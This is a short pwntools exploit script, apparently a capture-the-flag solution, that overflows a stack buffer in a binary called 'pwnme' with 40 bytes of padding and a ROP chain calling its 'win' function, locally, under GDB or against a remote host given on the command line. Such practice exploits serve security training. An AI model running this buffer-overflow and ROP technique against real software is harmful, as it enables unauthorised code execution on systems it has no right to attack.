#!/usr/bin/env python3
from pwn import *

exe = './pwnme'

elf = context.binary = ELF('pwnme')
context.terminal = ['alacritty', '-e', 'zsh', '-c']

#context.log_level= 'DEBUG'

def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


gdbscript = '''
tbreak main
continue
'''.format(**locals())

io = start()
rop = ROP(exe)
OFFSET = 40


payload = b'A' * OFFSET
rop.raw(rop.ret)
rop.win(0xdeadbeefdeadbeef)
payload += rop.chain()

io.sendline(payload)
io.interactive()